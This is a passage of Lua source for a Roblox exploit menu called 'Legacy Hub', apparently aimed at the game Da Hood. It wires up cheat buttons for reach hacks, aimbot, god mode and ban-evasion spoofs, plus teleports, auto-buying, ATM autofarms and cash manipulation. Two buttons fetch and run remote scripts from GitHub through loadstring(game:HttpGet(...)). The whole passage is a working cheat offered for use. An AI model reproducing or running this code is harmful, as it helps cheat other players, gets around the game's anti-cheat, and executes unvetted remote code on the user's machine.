		sd.Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
		sd.GripForward = Vector3.new(0, 0, -1)
		sd.GripPos = Vector3.new(-2.4, -0.7, 0)
		sd.GripUp = Vector3.new(1, 0, 0)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
	end);
	local FreeFists = CombatChannel:Button('Free Fists (R)', function()
		-- // Variables
		local localPlayer       = game:GetService("Players").LocalPlayer;
		local localCharacter    = localPlayer.Character
		local Mouse             = localPlayer:GetMouse();
		local FistControl       = false
		local LeftFist          = localCharacter.LeftHand;
		local RightFist         = localCharacter.RightHand;

		-- // Services
		local uis = game:GetService("UserInputService");

		-- // Coroutine Loop + Functions
		local loopFunction = function()
			LeftFist.CFrame  = CFrame.new(Mouse.Hit.p);
			RightFist.CFrame = CFrame.new(Mouse.Hit.p);
		end;

		local Loop

		local Start = function()
			Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
		end;

		local Pause = function()
			Loop:Disconnect()
		end;

		-- // Hotkeys
		uis.InputBegan:connect(function(Key)
			if (Key.KeyCode == Enum.KeyCode.R) then
				if (FistControl == false) then
					FistControl = true;
					Start();
					pcall(function()
						localCharacter.RightHand.RightWrist:Remove();
						localCharacter.LeftHand.LeftWrist:Remove();
					end);
				elseif (FistControl == true) then
					FistControl = false;
					Pause();
					local rightwrist  = Instance.new("Motor6D");
					rightwrist.Name   = "RightWrist";
					rightwrist.Parent = localCharacter.RightHand;
					rightwrist.C0     = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					rightwrist.C1     = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					rightwrist.Part0  = localCharacter.RightLowerArm;
					rightwrist.Part1  = localCharacter.RightHand;

					local leftwrist   = Instance.new("Motor6D");
					leftwrist.Name    = "LeftWrist";
					leftwrist.Parent  = localCharacter.LeftHand;
					leftwrist.C0      = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					leftwrist.C1      = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
					leftwrist.Part0   = localCharacter.LeftLowerArm;
					leftwrist.Part1   = localCharacter.LeftHand;
				end;
			end;
		end); 
	end);
	local FreeFists = CombatChannel:Button('Fist Wave', function()
		local Part = Instance.new("Part",workspace)
		Part.Name = "Part"
		Part.Anchored = false
		Part.CanCollide = false
		Part.Transparency = 1
		local Part1= Instance.new("Part",workspace)
		Part1.Name = "Part1"
		Part1.Anchored = true
		Part1.CanCollide = false
		Part1.Transparency = 1

		local Weld = Instance.new("Weld", Part1)
		Weld.Part0 = Part1
		Weld.Part1 = Part
		Weld.C0 = CFrame.new(0, 0, 10000)
		pcall(function()
			if game:GetService("Players").LocalPlayer.Character.RightHand:FindFirstChildOfClass("Model") then
				game:GetService("Players").LocalPlayer.Character.RightHand.Model.RightWrist:Destroy()
			end
			game:GetService("Players").LocalPlayer.Character.RightHand.RightWrist:Destroy()
		end)
		local laugh = 0
		while true do
			wait()
			laugh = laugh+200
			Part1.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, laugh, math.pi/-2)
			local lol = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
			game:GetService("Players").LocalPlayer.Character.RightHand.CFrame = CFrame.new(Part.CFrame.X ,Part.CFrame.Y+2, Part.CFrame.Z)
			game:GetService("Players").LocalPlayer.Character.RightHand.Massless = true
			game:GetService("Players").LocalPlayer.Character.RightHand.Size = Vector3.new(0, 0, 0)

		end

		local lol = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
		game:GetService("Players").LocalPlayer.Character.RightHand.Size = Vector3.new(1, 0.5, 1)
		for i = 1, 10 do
			game:GetService("Players").LocalPlayer.Character.RightHand.CFrame = lol.CFrame
			wait(0.05)
		end 
	end);
	local FistReach = CombatChannel:Button('Fist Reach', function()
		LP = game.Players.LocalPlayer 

		for i,v in ipairs(LP.Character:GetDescendants()) do 
			if v:IsA("MeshPart") then v.Massless = true 
				v.CanCollide = false 
				v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0, 0, 0) 
			end 
		end 

		for i,v in ipairs(game.workspace:GetDescendants()) do 
			if v:IsA("Seat") then 
				v.Disabled = true 
			end 
		end 

		x = 45
		y = 45 
		z = 45

		penis = Vector3.new(x,y,z) 

		LP.Character.RightHand.Size = penis 
		LP.Character.RightHand.Transparency = 1

		local selectionBox = Instance.new("SelectionBox",LP.Character.RightHand) 
		selectionBox.Adornee = LP.Character.RightHand 
		selectionBox = Enum.Material.Neon 

		LP.Character.LeftHand.Size = penis
		LP.Character.LeftHand.Transparency = 1

		LP.Character.BodyEffects.SpecialParts.LeftHand.Size = penis 
		LP.Character.LeftHand.Transparency = 1

		local selectionBox = Instance.new("SelectionBox",LP.Character.LeftHand) 
		selectionBox.Adornee = LP.Character.LeftHand 
		selectionBox = Enum.Material.Neon
	end);
	local ToolReach = CombatChannel:Button('Tool Reach', function()
		if syn or KRNL_LOADED then
			while true do
				game:GetService("RunService").Stepped:Wait()
				local success, err = pcall(function()
					if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
						for i,v in pairs(game:GetService('Players'):GetChildren()) do
							if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
								if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
									if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
										firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
									else
										firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
										firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
									end
								end
							end
						end
					end
				end)
			end
		else
			for i, v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren()) do
				if v:isA("Tool") then
					v.Handle.Size = Vector3.new(50, 50, 50)
					v.Handle.Transparency = 1
				end
			end
		end
	end);
	local AutoPick = CombatChannel:Button('Auto Pick', function()
		for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('ItemsDrop'):GetChildren()) do
			if v.Name == 'Part' then
				if v:FindFirstChild('[LockPicker]') or v:FindFirstChild('[Knife]') then
					v:FindFirstChildOfClass('Tool'):FindFirstChild('Handle').CFrame = game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame;
				end;
			end;
		end;
	end);
	local SplitGrenade = CombatChannel:Button('Split Grenade (B)', function()
		local plr = game.Players.LocalPlayer
		local lastpos = plr.Character.HumanoidRootPart.CFrame

		repeat wait()
			plr.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop["[Grenade] - $700"].Head.CFrame
			fireclickdetector(game.Workspace.Ignored.Shop["[Grenade] - $700"].ClickDetector)
		until game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.B)
		plr.Character.HumanoidRootPart.CFrame = lastpos

		for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
			wait(0.05)
			spawn(function()
				if v.Name == "[Grenade]" then
					v.Parent = plr.Character; v:Activate(); wait(0.1); v:Deactivate(); wait(0.1); v:Activate()
				end
			end)
		end
	end);
	local Aimbot = CombatChannel:Button('Aimbot', function()
		local notifSound = Instance.new("Sound",workspace)
		notifSound.PlaybackSpeed = 1.5
		notifSound.Volume = 0.15
		notifSound.SoundId = "rbxassetid://170765130"
		notifSound.PlayOnRemove = true
		notifSound:Destroy()
		game.StarterGui:SetCore("SendNotification", {Title = "Legacy Hub", Text = "Hold Right Click to aimlock", Icon = "rbxassetid://505845268", Duration = 15, Button1 = "Okay"})
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20aimlock%20(rightclick).lua'))();
	end);
	local AntiSlow = CombatChannel:Button('Anti Slow', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Humanoid').Name = 'H€mąńóid';
	end);
	local AntiAFK = CombatChannel:Button('Anti AFK', function()
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
			vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			wait(1)
			vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
		end)
	end);

	local Tornado = CombatChannel:Button('Tornado', function()
		local d = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
		pcall(function()
			for i, v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetChildren()) do
				if v.Name == '[Knife]' then
					v.Parent = game:GetService("Players").LocalPlayer.Character
				end
			end
		end)
		wait(.2)
		local targetpos = CFrame.new(-278.063446, 21.75, -240.871841)
		local plr = game:GetService("Players").LocalPlayer
		local pos = plr.Character.HumanoidRootPart.Position
		if not game:GetService("Players").LocalPlayer.Character:FindFirstChild("[Knife]") then
			plr.Character.HumanoidRootPart.CFrame = targetpos
			local cd = game:GetService("Workspace").Ignored.Shop["[Knife] - $150"]:FindFirstChild("ClickDetector")
			wait(.2)
			fireclickdetector(cd)
			wait(.2)
			game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripPos = Vector3.new(2, -5, -1.5)
			game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripForward = Vector3.new(0, 0, 0)
			game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripRight = Vector3.new(1, 0, -3)
			game:GetService("Players").LocalPlayer.Backpack["[Knife]"].GripUp = Vector3.new(0, 0, 0)
			game:GetService("Players").LocalPlayer.Backpack["[Knife]"].Parent = game:GetService("Players").LocalPlayer.Character
			spin = true
			local spinSpeed = 100
			local speaker = game:GetService("Players").LocalPlayer
			for i, v in pairs(speaker.Character.HumanoidRootPart:GetChildren()) do
				if v.Name == "Spinning" then
					v:Destroy()
				end
			end
			local Spin = Instance.new("BodyAngularVelocity", speaker.Character.HumanoidRootPart)
			Spin.Name = "Spinning"
			Spin.MaxTorque = Vector3.new(0, math.huge, 0)
			Spin.AngularVelocity = Vector3.new(0, spinSpeed, 0)
		end
		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
	end);
	local FlyGun = CombatChannel:Button('Fly Gun', function()
		for _, v in pairs(game:GetService('Players').LocalPlayer.Character:GetChildren()) do
			if v:isA("Tool") then
				v.GripPos = Vector3.new(10,-10,10);
			end
		end
	end);
	local SkinnyUnban = CombatChannel:Button('Skinny Unban', function()
		local localPlayer = game:GetService('Players').LocalPlayer;
		local localCharacter = localPlayer.Character;
		localCharacter:FindFirstChildOfClass('Humanoid'):Destroy();
		local newCharacter = localPlayer.CharacterAdded:Wait();
		local spoofFolder = Instance.new('Folder');
		spoofFolder.Name = 'FULLY_LOADED_CHAR';
		spoofFolder.Parent = newCharacter;
		newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
		local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
		spoofValue.Name = 'Dead';
		wait(1);
		localPlayer.Character:WaitForChild('Humanoid'):WaitForChild('BodyWidthScale').Value = 0.5;
	end);
	local SkinnyGodMode = CombatChannel:Button('Skinny God Mode', function()
		local localPlayer = game:GetService('Players').LocalPlayer;
		local localCharacter = localPlayer.Character;
		localCharacter:FindFirstChildOfClass('Humanoid'):Destroy();
		local newCharacter = localPlayer.CharacterAdded:Wait();
		local spoofFolder = Instance.new('Folder');
		spoofFolder.Name = 'FULLY_LOADED_CHAR';
		spoofFolder.Parent = newCharacter;
		newCharacter:WaitForChild('BodyEffects').Dead:Destroy();
		newCharacter:WaitForChild('BodyEffects').BreakingParts:Destroy();
		local spoofValue = Instance.new('BoolValue', newCharacter.BodyEffects);
		spoofValue.Name = 'Dead';
		wait(1);
		localPlayer.Character:WaitForChild('Humanoid'):WaitForChild('BodyWidthScale').Value = 0.5;
	end);

	local Bank = TeleportsChannel:Button('Bank', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-485.668, 23.631, -285.169);
	end);
	local Boxing = TeleportsChannel:Button('Boxing Place', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-236.006, 23.151, -1120.531);
	end);
	local Police = TeleportsChannel:Button('Police Station', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-267.637, 21.807, -121.982);
	end);
	local Admin = TeleportsChannel:Button('Admin Base', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-729.895, -37.642, -885.8);
	end);
	local Sewers = TeleportsChannel:Button('Sewers', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(112.622, -26.212, -277.321);
	end);
	local Shoe = TeleportsChannel:Button('Shoe Store', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(workspace.Ignored.Drop:FindFirstChildOfClass("MeshPart").Position);
	end);
	local Hospital = TeleportsChannel:Button('Hospital', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(86.518, 21.755, -481.680);
	end);
	local Phone = TeleportsChannel:Button('Phone Store', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-120.121, 22.946, -870.425);
	end);
	local Taco = TeleportsChannel:Button('Taco Shack', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(584.5401, 51.061409, -479.443848);
	end);
	local Casino = TeleportsChannel:Button('Casino', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-879.277, 21.254, -190.199);
	end);
	local UFO = TeleportsChannel:Button('UFO', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(71.565, 142.926, -690.33);
	end);
	local Fire = TeleportsChannel:Button('Fire Station', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-132.674, 21.280, -145.176);
	end);
	local Church = TeleportsChannel:Button('Church', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(203.938, 21.75, -98.446);
	end);
	local Gun1 = TeleportsChannel:Button('Gun Store 1', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(-582, 7.172, -739.015);
	end);
	local Gun2 = TeleportsChannel:Button('Gun Store 2', function()
		game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(475.022, 48.005, -603.737);
	end);

	for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Shop'):GetChildren()) do
		local v = AutobuyChannel:Button(v.Name, function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			local k = game.Workspace.Ignored.Shop[v.Name]
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
			if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
				wait(.2)
				fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
			end
		end);
	end;

	local FistFarm = AutofarmChannel:Toggle('Fist Farm', nil, function(Value)
		_G.Rob = Value;
	end);
	local ShoeFarm = AutofarmChannel:Toggle('Shoe Farm', nil, function(Value)
		_G.Shoe = Value;
	end);
	local HospitalFarm = AutofarmChannel:Toggle('Hospital Farm', nil, function(Value)
		_G.bottle = Value;
	end); 
	local BoxFarm = AutofarmChannel:Toggle('Box Farm', nil, function(Value)
		_G.box = Value;
	end);
	local MuscleFarm = AutofarmChannel:Toggle('Muscle Farm', nil, function(Value)
		_G.muscle = Value;
	end);
	local LettuceFarm = AutofarmChannel:Toggle('Lettuce Farm', nil, function(Value)
		_G.lettuce = Value;
	end);
	local P90Farm = AutofarmChannel:Button('P90 Farm', function()
		if game.Players.LocalPlayer.Character.Animate:FindFirstChild("idle") then
			game.Players.LocalPlayer.Character.Animate.idle:Destroy()
		end
		local me = game:service'Players'.LocalPlayer
		local plr = game.Players.LocalPlayer
		local savedarmourpos = plr.Character.HumanoidRootPart.Position
		local toolname = "[P90] - $1000"
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop[toolname].Head.Position)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		me.Character.Humanoid:EquipTool(me.Backpack:FindFirstChild("[P90]"))
		wait(0.001)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
		function bypass()
			local oh1 = CFrame.new(-346.434296, 52.5954704, 446.756989)
			local oh2 = game:GetService("Players")
			local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


			oh3.CFrame = oh1
			wait(1.5)
		end
		repeat
			wait()
		until game:IsLoaded()

		if workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[P90]") then
			workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[P90]").Name = "[P900]"
		else
			game.Players.LocalPlayer.Backpack["[P90]"].Parent = workspace.Players[game.Players.LocalPlayer.Name]
			game.workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[P90]").Name = "[P900]"
		end

		function Buy()
			fireclickdetector(workspace.Ignored.Shop["120 [P90 Ammo] - $60"].ClickDetector)
		end

		local timer = 0
		local ATM = "nil"
		local GetAmmoOrReload = false
		local Cash = false

		function GetCash()
			for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
				if
					v.Name == "MoneyDrop" and
						(workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 12
				then
					Cash = true
					fireclickdetector(v.ClickDetector)
					wait(1)
					Cash = false
				end
			end
		end

		function getATM()
			for i, v in pairs(workspace.Cashiers:GetChildren()) do
				if v:WaitForChild("Humanoid").Health > 0 then
					local cf = v.Head.CFrame
					local lv = cf.lookVector
					game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
						cf + (lv * Vector3.new(0, 0, -3))
					game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePos", v.Head.Position)
					return v
				end
			end
		end

		ATM = getATM()

		function reload(name, gun)
			local A_1 = "Reload"
			local A_2 = game:GetService("Workspace").Players[name][gun]
			local Event = game:GetService("ReplicatedStorage").MainEvent
			Event:FireServer(A_1, A_2)
		end

		game:GetService("RunService").Heartbeat:Connect(function()
			GetCash()
			game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
			if timer == 0 and Cash == false then
				if game.Players.LocalPlayer.DataFolder.Inventory["[P90]"].Value == "0" and GetAmmoOrReload == false then
					timer = 10
					GetAmmoOrReload = true
					local part = workspace.Ignored.Shop["120 [P90 Ammo] - $60"].Head
					game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
						CFrame.new(part.CFrame.X, part.CFrame.Y + 4, part.CFrame.Z)
					game.workspace.Players[game.Players.LocalPlayer.Name]["[P900]"].Parent =
						game.Players.LocalPlayer.Backpack
					wait(2)
					for i = 1, 10 do
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
							CFrame.new(
								part.CFrame.X + math.random(1, 2),
								part.CFrame.Y + math.random(1, 2),
								part.CFrame.Z + math.random(1, 2)
							)
						print "e"
						Buy()
						wait(1)
					end
					game.Players.LocalPlayer.Backpack["[P900]"].Parent =
						game.workspace.Players[game.Players.LocalPlayer.Name]
					timer = 0
					GetAmmoOrReload = false
					local cf = ATM.Head.CFrame
					local lv = cf.lookVector
					game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
						cf + (lv * Vector3.new(0, 0, -3))
				end
				if
					game.workspace.Players[game.Players.LocalPlayer.Name]:WaitForChild("[P900]").Ammo.Value == 0 and
						GetAmmoOrReload == false
				then
					GetAmmoOrReload = true
					reload(game.Players.LocalPlayer.Name, "[P900]")
					wait(2)
					GetAmmoOrReload = false
				else
					for i, v in pairs(workspace.Cashiers:GetChildren()) do
						if v:WaitForChild("Humanoid").Health > 0 then
							if GetAmmoOrReload == false then
								if ATM.Humanoid.Health > 0 then
									game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0, 0))
									local cf = ATM.Head.CFrame
									local lv = cf.lookVector
									game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
										cf + (lv * Vector3.new(0, 0, -3))
								end
							end
						end
					end
				end
				for i, v in pairs(workspace.Cashiers:GetChildren()) do
					if v:WaitForChild("Humanoid").Health > 0 then
						if ATM.Humanoid.Health < 0 and GetAmmoOrReload == false then
							timer = 10
							wait(0.1)
							if GetAmmoOrReload == false then
								local cf = ATM.Head.CFrame
								local lv = cf.lookVector
								game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
									cf + (lv * Vector3.new(0, 0, -3))

								ATM = getATM()
							end
							timer = 0
						end
					end
				end
			end
		end
		)
	end);
	local ShotgunFarm = AutofarmChannel:Button('Shotgun Farm', function()
		if game.Players.LocalPlayer.Character.Animate:FindFirstChild("idle") then
			game.Players.LocalPlayer.Character.Animate.idle:Destroy()
		end
		local me = game:service'Players'.LocalPlayer
		local plr = game.Players.LocalPlayer
		local savedarmourpos = plr.Character.HumanoidRootPart.Position
		local toolname = "[Shotgun] - $1250"
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop[toolname].Head.Position)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		fireclickdetector(game.Workspace.Ignored.Shop[toolname].ClickDetector)
		wait(.1)
		me.Character.Humanoid:EquipTool(me.Backpack:FindFirstChild("[Shotgun]"))
		wait(0.001)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
		plr.Character.HumanoidRootPart.CFrame = CFrame.new(savedarmourpos)
		function bypass()
			local oh1 = CFrame.new(-346.434296, 52.5954704, 446.756989)
			local oh2 = game:GetService("Players")
			local oh3 = oh2.LocalPlayer.Character.HumanoidRootPart


			oh3.CFrame = oh1
			wait(1.5)
		end
		repeat
			wait()
		until game:IsLoaded()

		if workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Shotgun]") then
			workspace.Players[game.Players.LocalPlayer.Name]:FindFirstChild("[Shotgun]").Name = "[Drxco]"

			function Buy()
				fireclickdetector(workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].ClickDetector)
				fireclickdetector(workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].ClickDetector)
			end

			local ATM = "nil"
			local idk = false
			local dineros = false
			local lol = 0

			function GetATM()
				bypass()
				for i, v in pairs(workspace.Cashiers:GetChildren()) do
					if v:WaitForChild("Humanoid").Health > 0 then
						local cf = v.Open.CFrame
						local lv = cf.lookVector
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = cf + (lv * Vector3.new(0, 0, -2))
						game.ReplicatedStorage.MainEvent:FireServer("UpdateMousePos", v.Open.Position)
						return v
					end
				end
			end

			function GETMONEY()
				for i, v in pairs(workspace.Ignored.Drop:GetChildren()) do
					if v.Name == "MoneyDrop" and (workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.Position - v.Position).Magnitude < 25
					then
						dineros = true
						fireclickdetector(v.ClickDetector)
						wait(0.7)
						dineros = false
					end
				end
			end

			ATM = GetATM()

			function reload(name, gun)
				local XD1 = "Reload"
				local XD2 = game:GetService("Workspace").Players[name][gun]
				local Event = game:GetService("ReplicatedStorage").MainEvent
				Event:FireServer(XD1, XD2)
			end
			game:GetService("RunService").Heartbeat:Connect(function()
				GETMONEY()
				game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
				if lol == 0 and dineros == false then
					if game.Players.LocalPlayer.DataFolder.Inventory["[Shotgun]"].Value == "0" and idk == false then
						lol = 10
						idk = true
						local part = workspace.Ignored.Shop["20 [Shotgun Ammo] - $60"].Head
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
							CFrame.new(part.CFrame.X, part.CFrame.Y + 4, part.CFrame.Z)
						game.workspace.Players[game.Players.LocalPlayer.Name]["[Drxco]"].Parent =
							game.Players.LocalPlayer.Backpack
						wait(2)
						for i = 1, 10 do
							game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
								CFrame.new(
									part.CFrame.X + math.random(1, 2),
									part.CFrame.Y + math.random(1, 2),
									part.CFrame.Z + math.random(1, 2)
								)
							Buy()
							wait(0.5)
						end
						game.Players.LocalPlayer.Backpack["[Drxco]"].Parent =
							game.workspace.Players[game.Players.LocalPlayer.Name]
						lol = 0
						idk = false
						local cf = ATM.Open.CFrame
						local lv = cf.lookVector
						game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
							cf + (lv * Vector3.new(0, 0, -2))
					end
					if
						game.workspace.Players[game.Players.LocalPlayer.Name]:WaitForChild("[Drxco]").Ammo.Value == 4 and
							idk == false
					then
						idk = true
						reload(game.Players.LocalPlayer.Name, "[Drxco]")
						wait(0.5)
						idk = false
					else
						for i, v in pairs(workspace.Cashiers:GetChildren()) do
							if v:WaitForChild("Humanoid").Health > 0 then
								if idk == false then
									if ATM.Humanoid.Health > 0 then
										game:GetService("VirtualUser"):Button1Down(Vector2.new(0, 0, 0))
										local cf = ATM.Open.CFrame
										local lv = cf.lookVector
										game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
											cf + (lv * Vector3.new(0, 0, -2))
									end
								end
							end
						end
					end
					for i, v in pairs(workspace.Cashiers:GetChildren()) do
						if v:WaitForChild("Humanoid").Health > 0 then
							if ATM.Humanoid.Health < 0 and idk == false then
								lol = 10
								wait(0.1)
								if idk == false then
									local cf = ATM.Open.CFrame
									local lv = cf.lookVector
									game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame =
										cf + (lv * Vector3.new(0, 0, -2))

									ATM = GetATM()
								end
								lol = 0
							end
						end
					end
				end
			end)
		end
	end);

	local FastDrop = CashChannel:Toggle('Fash Drop Cash', nil, function(Value)
		_G.FastDropCash = Value
	end);
	local AutoCollect = CashChannel:Toggle('Auto Collect Cash', nil, function(Value)
		_G.AutoCollectCash = Value
	end);
	local DropAmount = CashChannel:Slider('Fast Drop Amount', 0, 10000, 10000, function(Value)
		_G.FastDropAmount = Value;
	end);
	local FakeCash = CashChannel:Slider('Fake Cash', 0, 1000000000, 0, function(Value)
		game:GetService('Players').LocalPlayer:FindFirstChild('DataFolder'):FindFirstChild('Currency').Value = Value;
	end);
	local CashESP = CashChannel:Button('Cash ESP', function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/Legacy-Foundation/RuzzIsCool/main/dh%20money%20esp.lua'))();
	end);
	local CashBring = CashChannel:Button('Cash Bring', function()
		for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
			if v.Name == 'MoneyDrop' then
				v.Position = game:GetService('Players').LocalPlayer.Character:FindFirstChild('Head').CFrame.p + Vector3.new(0, 1, 0);
				v.Anchored = false;
			end;
		end;
	end);
	local CashBring = CashChannel:Button('Cash Bring', function()
		for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
			if v.Name == 'MoneyDrop' then
				v.Position = game:GetService('Players').LocalPlayer.Character:FindFirstChild('Head').CFrame.p + Vector3.new(0, 1, 0);
				v.Anchored = false;
			end;
		end;
	end);
	local CashScaffold = CashChannel:Button('Cash Scaffold', function()
		while wait() do
			for _, v in pairs(workspace:FindFirstChild('Ignored'):FindFirstChild('Drop'):GetChildren()) do
				if v.Name == 'MoneyDrop' then
					v.Position = game:GetService('Players').LocalPlayer.Character:FindFirstChild('Head').CFrame.p + Vector3.new(0, 1.5, -22);
